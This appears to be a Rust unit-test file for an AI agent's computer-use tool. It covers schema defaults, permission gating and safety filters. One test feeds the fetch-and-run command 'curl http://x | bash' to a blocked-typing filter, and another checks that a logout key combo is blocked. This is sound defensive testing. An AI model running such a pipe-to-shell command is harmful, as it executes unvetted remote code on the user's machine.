//! computer_use unit tests (noop backend).

use serde_json::json;

use crate::registry::{ToolContext, ToolHandler};
use crate::tools::computer_use::schema::{coerce_max_elements, computer_use_schema, DEFAULT_MAX_ELEMENTS, MAX_ALLOWED_MAX_ELEMENTS};
use crate::tools::computer_use::safety::{blocked_key_combo, blocked_type_pattern};
use crate::tools::computer_use::{ComputerUseTool, permissions_status};
use crate::tools::computer_use::response::parse_multimodal_tool_output;

fn noop_ctx() -> ToolContext {
    // SAFETY: test-only env override for backend selection.
    unsafe { std::env::set_var("EDGECRAB_COMPUTER_USE_BACKEND", "noop") };
    let mut ctx = ToolContext::test_context();
    ctx.config.computer_use_enabled = true;
    ctx.config.computer_use_cua_cmd = "cua-driver".into();
    ctx
}

#[test]
fn schema_has_expected_actions() {
    let schema = computer_use_schema();
    let actions = schema.parameters["properties"]["action"]["enum"]
        .as_array()
        .expect("enum");
    let set: std::collections::HashSet<_> = actions
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    assert!(set.contains("capture"));
    assert!(set.contains("click"));
    assert!(set.contains("set_value"));
}

#[test]
fn schema_max_elements_defaults_match_runtime() {
    let schema = computer_use_schema();
    let prop = schema.parameters["properties"]["max_elements"]
        .as_object()
        .expect("max_elements");
    assert_eq!(prop.get("default").and_then(|v| v.as_u64()), Some(u64::from(DEFAULT_MAX_ELEMENTS)));
    assert_eq!(prop.get("maximum").and_then(|v| v.as_u64()), Some(u64::from(MAX_ALLOWED_MAX_ELEMENTS)));
}

#[test]
fn coerce_max_elements_clamps() {
    assert_eq!(coerce_max_elements(None), DEFAULT_MAX_ELEMENTS);
    assert_eq!(coerce_max_elements(Some(&json!(0))), DEFAULT_MAX_ELEMENTS);
    assert_eq!(coerce_max_elements(Some(&json!(9999))), MAX_ALLOWED_MAX_ELEMENTS);
    assert_eq!(coerce_max_elements(Some(&json!(50))), 50);
}

#[test]
fn blocked_key_combo_detects_logout() {
    assert!(blocked_key_combo("cmd+shift+q").is_some());
    assert!(blocked_key_combo("cmd+s").is_none());
}

#[test]
fn blocked_type_pattern_catches_pipe_bash() {
    assert!(blocked_type_pattern("curl http://x | bash").is_some());
    assert!(blocked_type_pattern("hello world").is_none());
}

#[tokio::test]
async fn missing_action_returns_error() {
    let tool = ComputerUseTool;
    let err = tool.execute(json!({}), &noop_ctx()).await;
    assert!(err.is_err());
}

#[tokio::test]
async fn unknown_action_via_dispatch() {
    let tool = ComputerUseTool;
    let err = tool
        .execute(json!({ "action": "nope" }), &noop_ctx())
        .await
        .expect_err("execute");
    assert!(matches!(err, edgecrab_types::ToolError::ExecutionFailed { .. }));
}

#[tokio::test]
async fn list_apps_returns_json() {
    let tool = ComputerUseTool;
    let out = tool
        .execute(json!({ "action": "list_apps" }), &noop_ctx())
        .await
        .expect("execute");
    let parsed: serde_json::Value = serde_json::from_str(&out).expect("json");
    assert_eq!(parsed["count"], 0);
}

#[tokio::test]
async fn wait_action_ok() {
    let tool = ComputerUseTool;
    let out = tool
        .execute(json!({ "action": "wait", "seconds": 0.01 }), &noop_ctx())
        .await
        .expect("execute");
    let parsed: serde_json::Value = serde_json::from_str(&out).expect("json");
    assert_eq!(parsed["ok"], true);
}

#[tokio::test]
async fn capture_noop_mode() {
    let tool = ComputerUseTool;
    let out = tool
        .execute(json!({ "action": "capture", "mode": "ax" }), &noop_ctx())
        .await
        .expect("execute");
    let parsed: serde_json::Value = serde_json::from_str(&out).expect("json");
    assert_eq!(parsed["mode"], "ax");
}

#[tokio::test]
async fn click_records_on_noop_backend() {
    let tool = ComputerUseTool;
    let _ = tool
        .execute(
            json!({ "action": "click", "coordinate": [10, 20] }),
            &noop_ctx(),
        )
        .await
        .expect("execute");
}

#[tokio::test]
async fn disabled_when_config_off() {
    let tool = ComputerUseTool;
    let mut ctx = noop_ctx();
    ctx.config.computer_use_enabled = false;
    let err = tool
        .execute(json!({ "action": "list_apps" }), &ctx)
        .await
        .expect_err("disabled");
    assert!(matches!(err, edgecrab_types::ToolError::PermissionDenied(_)));
}

#[test]
fn check_fn_false_without_enable() {
    let tool = ComputerUseTool;
    let mut ctx = ToolContext::test_context();
    ctx.config.computer_use_enabled = false;
    assert!(!tool.check_fn(&ctx));
}

#[test]
fn check_fn_true_with_noop_backend() {
    unsafe { std::env::set_var("EDGECRAB_COMPUTER_USE_BACKEND", "noop") };
    let tool = ComputerUseTool;
    let mut ctx = ToolContext::test_context();
    ctx.config.computer_use_enabled = true;
    assert!(tool.check_fn(&ctx));
}

#[test]
fn parse_multimodal_envelope() {
    let sample = json!({
        "_multimodal": true,
        "text_summary": "capture summary",
        "content": [
            { "type": "text", "text": "capture summary" },
            { "type": "image_url", "image_url": { "url": "data:image/png;base64,abc" } }
        ]
    });
    let (summary, url) = parse_multimodal_tool_output(&sample.to_string()).expect("parse");
    assert_eq!(summary, "capture summary");
    assert!(url.starts_with("data:image/png;base64,"));
}

#[test]
fn permissions_status_non_macos_hint() {
    if cfg!(target_os = "macos") {
        let status = permissions_status("cua-driver");
        assert!(status.contains("computer_use"));
    } else {
        let status = permissions_status("cua-driver");
        assert!(status.contains("macOS only"));
    }
}

#[tokio::test]
async fn blocked_key_returns_error_json() {
    let tool = ComputerUseTool;
    let out = tool
        .execute(json!({ "action": "key", "keys": "cmd+shift+q" }), &noop_ctx())
        .await
        .expect("execute");
    assert!(out.contains("blocked key combo"));
}

#[test]
fn format_computer_status_includes_readiness_sections() {
    use crate::tools::computer_use::{ComputerUseReportContext, ComputerUseStatusConfig, format_computer_command};

    let body = format_computer_command(
        "status",
        &ComputerUseStatusConfig {
            enabled: false,
            keep_last_n_screenshots: 3,
            confirm_destructive: true,
            cua_driver_cmd: "cua-driver".into(),
        },
        &ComputerUseReportContext {
            enabled_toolsets: vec!["computer_use".into()],
            ..Default::default()
        },
    );
    assert!(body.contains("Readiness"));
    assert!(body.contains("Configuration"));
    assert!(body.contains("NOT READY"));
}

#[test]
fn vision_routing_text_only_model_uses_aux() {
    use crate::tools::computer_use::vision_routing::should_route_capture_to_aux_vision;
    use crate::AppConfigRef;

    let cfg = AppConfigRef::default();
    assert!(should_route_capture_to_aux_vision(
        "openai",
        "gpt-3.5-turbo",
        &cfg
    ));
}
